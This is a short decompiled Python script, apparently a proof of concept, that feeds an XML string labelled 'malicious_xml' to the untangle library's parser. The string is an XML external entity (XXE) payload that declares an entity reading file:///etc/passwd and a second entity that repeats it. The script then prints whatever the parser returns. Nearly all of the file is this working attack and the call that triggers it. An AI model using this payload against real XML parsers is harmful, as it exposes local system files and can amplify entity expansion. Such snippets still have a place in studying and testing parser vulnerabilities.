# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 252_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 531 bytes
import untangle

def parse_xml(xml_data):
    obj = untangle.parse(xml_data)
    return obj


malicious_xml = '\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n  <!ENTITY yxe "&xxe;&xxe;">\n]>\n<root>\n  <data>&yxe;</data>\n</root>\n'
try:
    result = parse_xml(malicious_xml)
    print(result)
except Exception as e:
    try:
        print(f"Error occurred: {e}")
    finally:
        e = None
        del e

# okay decompiling 252_1.pyc
